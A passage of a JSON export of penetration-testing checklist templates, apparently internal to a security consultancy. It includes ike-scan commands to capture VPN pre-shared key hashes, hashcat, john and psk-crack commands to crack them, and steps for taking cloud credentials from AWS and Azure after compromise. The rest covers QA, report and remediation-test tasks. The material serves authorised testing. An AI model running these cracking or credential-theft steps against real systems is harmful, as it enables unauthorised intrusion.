information can be used to capture and crack a weak PSK if Aggressive Mode is enabled.</p><p>If you decide to script this consider the following constraints:</p><p>The script first checks to see if Aggressive Mode is enabled, then confirms the endpoint is a Cisco device. Next it simply checks for a DPD response payload for a non-existent group name to confirm if the device is vulnerable. Then it simply loops through a wordlist provided as an argument. I've added a 4 millisecond wait in there to prevent the possibility of causing a DoS on devices with high load.</p><p>3.) Recover the hash of the pre-shared key (psk).  Please note that the group name must be valid in order to recover the correct hash.  Also note that there may be multiple valid groups. The following command should write the hash to the \"md5-vpn.psk\" file.</p><p>ike-scan 192.168.1.2 -M -A --id=validgroupid -P md5-vpn.psk</p><p>4.) Crack the recovered hash</p><p>There are a few options available for cracking when you have a valid hash, including psk-crack and Cain. The good news is it's now also supported in John The Ripper with the correct patch applied, allowing multi-core cracking. This can be accomplished with the following commands:</p><p>#Cracking with OCLHashcat - use cracky - preferred method</p><p>./hc.bin -m 5300  md5-vpn.psk  -a 3 ?a?a?a?a?a?a -n 800 --gpu-loops=1024</p><p>#Cracking with john</p><p>./ikescan2john.py md5-vpn.psk > md5.vpn.psk.john</p><p>mpirun -np 2 ./john -fo:ike md5.vpn.psk.john -i</p><p>#Cracking with psk-crack</p><p>psk-crack -b 5 --charset=\"01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" md5-vpn.psk</p><p>5.) In rare cases this will allow you to vpn in, but in most cases you will also need a valid username and password.</p><p>Sources: </p><p>http://blog.spiderlabs.com/2013/03/cracking-ike-aggressive-mode-hashes-part-1.html</p><p>https://www.trustwave.com/spiderlabs/advisories/TWSL2013-004.txt</p><p>------------------------------------</p><p>More Information</p><p>------------------------------------</p><p>Example 1:</p><p>#Request using invalid group name</p><p>ike-scan 10.70.70.25 -M -A --id=incorrectgroup</p><p>#Response using invalid group name</p><p>13:22:59.929273 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp: isakmp: phase 1 I agg</p><p>13:22:59.932624 IP 10.70</p>",
							"remediationInstructions": "<p>Consider the follow options to help lock down affected VPN concentrators.</p><ul><li><p>Disable Aggressive Mode and require the full Main mode handshake</p></li><li><p>Do not use only the Pre-Shared key for authentication if it is possible (Xauth + second factor preferred)</p></li><li><p>Use strong Pre-Shared key, unique to each user/site</p></li><li><p>Restrict VPN connections to only the public IP addresses that need access</p></li></ul>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 17,
				"collapsed": true
			},
			{
				"uid": "98a91ca2-464a-4fd5-aea8-7d8af4c63e5e",
				"name": "Post Exploitation: Pivotting & C2 Options",
				"description": "<p>This group of tasks is intended to provide guidance around  maintaining access to target environments once they have been compromised.</p>",
				"type": 3,
				"tasks": [
					{
						"uid": "fadf4f4e-770a-4b25-b665-ad60af871b79",
						"name": "Cloud - AWS Environment - Command Execution",
						"instructions": "<p>Once gaining some form of command execution in AWS, there are a number of next steps that you will want to take.</p><p>Each of the following AWS resource types may be a landing point for command execution:</p><ul><li><p>EC2 Instances</p></li><li><p>Lambda Functions</p></li></ul><p>Each of the different resources will have slightly different methods for post exploitation, but generally they will follow this pattern:</p><ul><li><p>Gain initial command execution</p></li><li><p>Check for an attached role on the IMDS</p></li><li><p>Generate temporary credentials</p></li><li><p>Use the credentials to authenticate to AWS</p></li><li><p>Enumerate your permissions within AWS</p></li><li><p>Gain access to other AWS resources and/or sensitive info</p></li></ul><p>Your best bet is to work with a CPen resource to further your access here, but here are some links that you can use as more immediate resources:</p><ul><li><p>https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/</p></li><li><p>https://outline.netspi.com/doc/guidelines-for-wapens-using-aws-o9xCGqpqkH#h-elastic-compute-cloud-ec2-elastic-container-service-ecs-and-lambda</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "c3331172-61ef-4b1d-976e-3c2834d829bd",
						"name": "Cloud - Azure Environment - Command Execution",
						"instructions": "<p>Once gaining some form of command execution in Azure, there are a number of next steps that you will want to take.</p><p>Each of the following Azure resource types may be a landing point for command execution:</p><ul><li><p>App Services / Function Apps</p></li><li><p>Virtual Machines</p></li><li><p>Container Instances</p></li><li><p>Azure Kubernetes Services (AKS)</p></li></ul><p>Each of the different resources will have slightly different methods for post exploitation, but generally they will follow this pattern:</p><ul><li><p>Gain initial command execution</p></li><li><p>Check for an attached Managed Identity</p><ul><li><p>There can be more than one</p></li></ul></li><li><p>Generate a temporary token for the Managed Identity</p></li><li><p>Use the token to authenticate to Azure</p></li><li><p>Enumerate your permissions within Azure</p></li><li><p>Gain access to other Azure resources and/or sensitive info</p></li></ul><p>Outside of Managed Identity token generation, it is also worthwhile to look a the following areas:</p><ul><li><p>Virtual Machine Extension Settings</p><ul><li><p>Requires Local Admin</p></li><li><p>Related Blog - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.netspi.com/blog/technical-blog/cloud-pentesting/decrypting-azure-vm-extension-settings-with-get-azurevmextensionsettings/\">https://www.netspi.com/blog/technical-blog/cloud-pentesting/decrypting-azure-vm-extension-settings-with-get-azurevmextensionsettings/</a></p></li></ul></li><li><p>Environmental Variables</p><ul><li><p>Several Azure Services store credentials that could be used for pivoting in environmental variables</p></li></ul></li><li><p>PowerShell and Bash history files</p><ul><li><p>These have been particularly useful in CPen post exploitation in the past</p></li><li><p>Cloud admins often run sensitive commands on cloud systems, resulting in sensitive data exposure</p></li></ul></li></ul><p>Your best bet is to work with a CPen resource to further your access here, but here are some links that you can use as more immediate resources:</p><ul><li><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.netspi.com/blog/technical-blog/cloud-pentesting/lateral-movement-azure-app-services/\">https://www.netspi.com/blog/technical-blog/cloud-pentesting/lateral-movement-azure-app-services/</a></p></li><li><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token\">https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token</a></p></li><li><p>Presentation on attacking Managed Identities from different Azure services - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.youtube.com/watch?v=efF5Up7zBrg\">https://www.youtube.com/watch?v=efF5Up7zBrg</a></p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 18,
				"collapsed": true
			},
			{
				"uid": "3af0802c-802a-40b2-91e2-762ef4d351f9",
				"name": "Project Workspace Tasks",
				"description": "This group of tasks includes things that need to be done within the project workspace in order to clean up finding prior to reporting.",
				"type": 1,
				"tasks": [
					{
						"uid": "830627fb-7036-45c8-93f1-b7a8f5060d04",
						"name": "Correlate findings",
						"instructions": "<h2>Instructions</h2><p>After automated scanning is complete, vulnerabilities data is exported from the tool and imported into Resolve. We then create a new manual finding that is rewritten and correlated to the automated tools plugin. Patch related findings may have correlations from multiple tools. In some cases patch related findings may also be rolled into a one of three master findings.  </p><p>Please consult with a principal security consultant the first few times you perform correlation to ensure you do it correctly.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "beb7e465-dec8-4d9e-aebc-5d974a9a5e72",
						"name": "Rename findings to meet convention",
						"instructions": "<h2>Instructions</h2><p>For newly findings identified by a scanning tool, create a new master findings using NetSPI standard naming conventions. If you are not familiar, reach out to your manager or the service lead.</p><p></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7388acdb-2eef-4d50-8a36-64cff466ace5",
						"name": "Verify severity rating",
						"instructions": "<h2>Instructions</h2><p>Review all severities to ensure that match the severity ranking criteria.</p><h2>Severity Level Guidelines</h2><p>NetSPI’s vulnerability severity rating system is based on the NIST CVSS v3 scores, the Center for Information Security (CIS) Benchmarks, the Payment Card Industry Data Security Standards (PCI DSS), and internally developed criteria.    </p><h3><strong>Critical</strong></h3><pre><code><strong>CVSS Range: </strong> 7.0 - 10.0 (Exploitable) \n\n<strong>Definition</strong>\nVulnerabilities that were exploited to gain initial access to the targeted systems, applications, or sensitive data are labeled as entry points. This includes vulnerabilities that have been successfully exploited in the past or that provide a man-in-the-middle position.\n\nVulnerabilities that were successfully exploited during testing will be labeled as Entry Points, so they can be prioritized during remediation.  \n\nExample: Code execution, arbitrary file read/write, persistent code injection, PHI/PCI data exposure. </code></pre><h3><strong>High</strong></h3><pre><code><strong>CVSS Range: </strong>  7.0 - 10.0 \n\n<strong>Definition</strong>\nVulnerabilities with the potential to provide direct, unauthorized, remote access to protected networks, systems, application functionality, or sensitive data. However, these may not have exploitable code available, or require rare configurations to be exploitable.\n\nExample: Code execution, arbitrary file read/write, persistent code injection, PHI/PCI data exposure. </code></pre><h3><strong>Medium</strong></h3><pre><code><strong>CVSS Range: </strong> 4.0 - 6.9 \n\n<strong>Definition</strong>\nVulnerabilities that result in the exposure of session data or security configuration information. Unencrypted transmission of sensitive data, or use of weak encryption methods. This includes management, database, and file sharing interfaces that are exposed to the internet, but do not currently enforce multi-factor authentication.\n\nExample: Cross-site scripting, open SMTP relay, clear text storage of passwords/sensitive data, and cleartext management protocols such as telnet. </code></pre><h3><strong>Low</strong></h3><pre><code><strong>CVSS Range: </strong> 0.0 - 3.9 \n\n<strong>Definition</strong>\nVulnerabilities that result in the exposure version information or non-critical configuration information. Best practice configurations that help reduce attack surface and reduce the chance of the successful exploitation of other vulnerabilities.\n\nExample: Most SSL findings, RDP findings, password policy best practices, and large number of members in privileged groups.</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "79b9da9e-f29b-4366-95f6-8e40da703d13",
						"name": "Publish findings as they are finalized to support PTAAS",
						"instructions": "<h2>Instructions</h2><p>1. Log into Platform.</p><p>2. Click workbench</p><p>3. Click Projects</p><p>4. Choose the target project</p><p>5. Select the workspace, right-click the finding, set the state to final</p><p>6. Click findings in the workspace menu</p><p>7. In the upper right-hand corner of the screen click \"Publish All\"</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8f1aff0e-e16e-4ede-80af-e1b8878f46fb",
						"name": "Submit for QA in Platform",
						"instructions": "<h2>Instructions</h2><p>Follow the process defined on the Outline page below:</p><pre><code>https://outline.netspi.com/doc/qa-processes-crkfWzC6sA</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 19,
				"collapsed": true
			},
			{
				"uid": "334974c6-0357-4efe-a0c7-c43aae1c6eb3",
				"name": "Project QA Checklist",
				"description": "Project QA Checklist",
				"type": 2,
				"tasks": [
					{
						"uid": "82b3b063-9076-4c4d-9782-14a956442294",
						"name": "QA Reference Links",
						"instructions": "<h2>Instructions</h2><p>Just mark this task as complete, but know additional references can be found below.</p><p><strong>NetSPI Reporting Process and Standards Documentation</strong></p><p>https://outline.netspi.com/doc/reporting-process-and-standards-SACBlYJKcn</p><p><strong>NetSPI QA Process</strong></p><p>https://outline.netspi.com/doc/qa-processes-crkfWzC6sA</p><p><strong>Additional Links and Information</strong></p><p></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "72dd2f63-1775-440f-9485-2cd147f251c0",
						"name": "Platform: Verify correct client project type and template",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "c9053771-53df-4929-86f9-4c7566e8202f",
						"name": "Platform: Verify client name",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "642acac5-021a-444b-a762-8a4535f53764",
						"name": "Platform: Verify start and end dates",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7d19995b-d1cc-44d1-b555-9557d1299b28",
						"name": "Platform: Verify scope in Project Overview section",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "72a16ad0-e14d-40eb-aa38-0a99902d375b",
						"name": "Platform: Verify all findings have been published",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7f63329e-42ec-4af0-9fc4-4c206f9edb91",
						"name": "Platform: Verify Data",
						"instructions": "<h2>Instructions</h2><p>Verify all data has been properly collected, uploaded, and analyzed.</p><h3>Examples:</h3><ul><li><p>Verify ASM exports have been uploaded to Documents</p></li><li><p>Verify ExPowerPen results have been uploaded to Internal Documents</p><ul><li><p>Verify scope of ExPowerPen was correct and everything was properly enumerated</p></li><li><p>Verify Nmap results have been uploaded to Sources</p></li><li><p>Verify domain enumeration results have been uploaded to Documents</p></li><li><p>Verify ADS domain enumeration results have been uploaded to Documents</p></li><li><p>Verify cloud enumeration results have been uploaded to Documents</p></li><li><p>Verify employee enumeration results have been uploaded to Documents</p></li></ul></li><li><p>Verify Nessus, Burp, and Web Scraping enumeration results have been uploaded to Documents</p></li><li><p>Verify Docker, GitHub, and Clipboard enumeration have been performed</p></li><li><p>Verify login page, default and weak password checks, and SMTP checks have been performed</p></li><li><p>Verify password guessing has been performed</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2b8b290b-59f8-401b-90e4-cb3d3a35067c",
						"name": "Platform: Verify clean workspace and checklist completion",
						"instructions": "<p>Review the checklist and workspace, verify that checklist items are commented, especially items marked N/A. </p><p>Verify findings marked false positive have additional verification(s) explaining the reasoning for the false positive result.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8d57ffcf-d0eb-411e-b625-75972ae08fe9",
						"name": "Platform: Verify finding correlation",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "cb252905-5160-48c2-ad82-2c28c30e9696",
						"name": "Platform: Verify previous project comparison",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "492cd1c4-002b-4e29-9a5d-d2ee22efd151",
						"name": "Report: Verify correct client template (If Applicable)",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 10,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "05384319-2856-42fc-b065-d0fc7cd3b4da",
						"name": "Report: Verify client name",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 11,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "6bc99d88-cd27-4c31-a190-1862b4868640",
						"name": "Report: Verify Scope matches SoW",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 12,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "6a994111-f19e-44c9-9d09-f95c29a99028",
						"name": "Report: Verify headers and footers",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 13,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "339c5507-f22a-4fde-ae18-1bc04ceb0da5",
						"name": "Report: Verify number of systems and vulnerabilities",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 14,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5b45b969-7e40-4978-8d4d-d102c2b01b9b",
						"name": "Report: Verify findings technically accuracy",
						"instructions": "<p>Verify findings technically accurate and ranked correctly, summary info accurate</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 15,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "19c4c79a-279c-484e-a0ca-baf5dbe46fd2",
						"name": "Report: Verify finding naming and writeups",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 16,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "36fdfd79-3542-4ad6-ad6f-3a9158542ddc",
						"name": "Report: Verify truncation of long URL lists",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 17,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7f92f3e2-a034-4fa0-8f28-3c2e135da1a6",
						"name": "Report: Verify all sensitive data is redacted",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 18,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d2004fcc-415c-436d-8d4b-6d007ad21da1",
						"name": "Report: Spellcheck & update fields (CTRL+A F9)",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 19,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "73ee2353-65a3-4c41-8587-03e512cf2e96",
						"name": "Report: Update contacts and report history",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 20,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 20,
				"collapsed": true
			},
			{
				"uid": "68611e5d-a3fe-4a7a-98c6-5f0675fe0316",
				"name": "Remediation Test Tasks",
				"description": "Tasks for conducting a remediation test.",
				"type": 1,
				"tasks": [
					{
						"uid": "6f630e05-854f-4a89-992e-9de0b6232140",
						"name": "Check scope of remediation testing",
						"instructions": "<p>Read the project description to confirm what findings are in scope for remediation testing. For ExPen, this should typically be medium and higher severity findings.</p><p>For all findings that do not fall in-scope of remediation testing, mark them as \"Not Retested\". Note that you will have to manually change this in the report later on as well.</p><p>Escalate to your manager or service line lead if the scope is larger and seems like too much for the time provided.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "fb8b854b-e9f2-4acc-9f8c-4b0b2b3ee82e",
						"name": "Conduct remediation testing on in-scope findings",
						"instructions": "<p>Retest each finding for all instances using the same steps as the original verifications.</p><p>1. If the finding is remediated, mark it <strong>Remediated</strong>.</p><p>2. If the finding is still reproduced using the same steps, mark it <strong>Not Remediated</strong>.</p><p>3. If the finding instance is reproduced using different steps than the original verifications, mark it <strong>Not Remediated </strong>add a new verification using the below as a template:</p><p>Remediation Test Observation MM/DD/YYYY - NetSPI conducted a remediation test on this finding and observed it is not remediated. New verification steps have been provided to highlight deviations from the original verifications steps that are required to reproduce the vulnerability. </p><pre><code>&lt;verification stuff&gt;</code></pre><p>4. If the system or service is offline at the time of remediation testing, mark it <strong>Remediated </strong>add a new verification using the below as a template:</p><p>Remediation Test Observation MM/DD/YYYY - NetSPI observed this service was offline at the time of remediation testing and has noted this finding as Remediated.</p><pre><code>&lt;nmap showing the service is offline&gt;</code></pre><p>5. If the original finding is identified to be false positive, mark it <strong>Remediated </strong>and add an additional verification using the below as a template:</p><p>Remediation Test Observation MM/DD/YYYY - Through further testing, this finding was deemed false positive. &lt;description of further testing or false positive if applicable&gt;</p><pre><code>&lt;verification stuff if applicable&gt;</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "19e0e8f6-6e6e-4ec9-b2c4-4c91ba944c5b",
						"name": "Sharepoint: Download original report",
						"instructions": "<p>Pull the original report using the Sharepoint link in the project summary page. Mark this task complete once downloaded.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5333046c-b23c-4aa0-9690-7b132e57f76d",
						"name": "Platform: Generate Remediation report",
						"instructions": "<p>Use Platform to generate a remediation report for the project. Make sure to use the correct \"Remediation\" template for your project type. Mark this task complete once the report is generated.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "17861d52-61ee-4295-87df-02b6fb50a436",
						"name": "Report: Manually sync original and remediation reports",
						"instructions": "<p>There are several items that may need to be carried over from the original report to the remediation report that was generated.</p><p>1. <strong>Chapter 1.2 Executive Summary - Summary of Results</strong></p><p>2. <strong>Chapter 1.3 Executive Summary - Summary of Recommendations</strong></p><p>3. <strong>Chapter 2.1 Project Overview - Scope</strong></p><p>4. <strong>Chapter 2.2 Project Overview - Constraints</strong></p><p>5. <strong>Chapter 4 Penetration Test Attack Narrative </strong>(if applicable). If no narrative, delete this section from the Remediation report.</p><p>6. <strong>Appendix A - NetSPI Contact Information</strong></p><p>7. <strong>Appendix B - Systems in Scope</strong></p><p>8. <strong>Revision History</strong> - Copy the original revision history table information into the Remediation report, then add 1 line for version 2.0 with your name, the date, and the description/comment \"Remediation Report\"</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "779fd000-f50e-4fab-9dc1-d28da008df66",
						"name": "Report: Cleanup and finalize Remediation report",
						"instructions": "<p>Perform typical cleanup of the report to finalize such as checking dates, Ctrl+F for &quot;References&quot; and make sure there are no extra line feeds, make sure all findings have a remediation category, etc.</p><p>Upload to Sharepoint and let the PM know when the Remediation report is ready for delivery.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 21,
				"collapsed": true
			}
		],
		"checklistTemplateUid": "f0f0c6fe-30a6-4dd2-9808-9a2589312036",
		"isDeleted": false
	},
	{
		"uid": "5646f2b5-641b-4a0d-9dbf-bb773399f57f",
		"name": "Consultant Driven Pipeline",
		"categories": [
			{
				"uid": "149a12ee-72c6-4639-8a32-09700765c57a",
				"name": "Consultant Driven Pipeline",
				"description": "<p>Additional testing services the Sales team engage with the Client</p>",
				"type": 1,
				"tasks": [
					{
						"uid": "49173de7-110d-4507-8a5a-9d93de9b4f78",
						"name": "SharePoint Form Link",
						"instructions": "<h3>Instructions:</h3><p>Fill out the SharePoint Form if there are other NetSPI service lines or offerings you think the client could benefit from.</p><p>If the referred opportunity is won, then the submitting consultant will receive an incentive called a SPIF - Sales Performance Incentive Funds.</p><h3>SharePoint Link:</h3><p><a href='https://forms.office.com/r/RJCb8Y6TC5'>https://forms.office.com/r/RJCb8Y6TC5</a></p><h3>Most Frequent Cross-Service Opportunities:</h3><p>Here are some of the more common cross-service sale opportunities.</p><ul><li><p>ExPen to CPen: if there are cloud resources</p></li><li><p>ExPen to WAPen: if there are many web apps discovered</p></li><li><p>WAPen to CPen: if there are cloud resources</p></li><li><p>WAPen to SCR: if there are common code findings (XSS, SQLi, authorization bypass)</p></li><li><p>InPen to BAS/CAASM/WAPen: many options based on what is seen</p></li></ul><h3></h3><h3>Workflow:</h3><ol><li><p>Consultant completes an engagement using their checklist and they have a new lead to submit to Sales.</p></li><li><p>From the checklist task in Platform, they submit the above <a href='https://forms.office.com/r/RJCb8Y6TC5'>SharePoint form</a>.</p></li><li><p>The SharePoint form sends an email to SalesOps to enter the lead into SalesForce.</p></li><li><p>SalesOps processes the lead in SF and emails the sales rep about the new lead.</p></li><li><p>Sales rep schedules an internal call with the consultant to ask any questions.</p></li><li><p>Sales rep either schedules a client qualification call or marks the opportunity closed/lost</p></li><ol><li><p>If closed/lost, consultant does not receive the SPIF.</p></li></ol><li><p>Sales rep holds qualification call with the client and either marks the opportunity closed/lost or moves it into the pipeline.</p></li><ol><li><p>If closed/lost, consultant does not receive SPIF.</p></li></ol><li><p>Sales rep works the deal.</p></li><ol><li><p>If the opp is closed/lost, the consultant does not receive SPIF</p></li><li><p>If the opportunity is won, the consultant receives the SPIF payment per the amount and timeline details explained in the Compensation Plan.</p></li></ol></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 0,
				"collapsed": true
			}
		],
		"checklistTemplateUid": "4431eebc-a3b7-4ad3-98bb-d1680371a855",
		"isDeleted": false
	}
]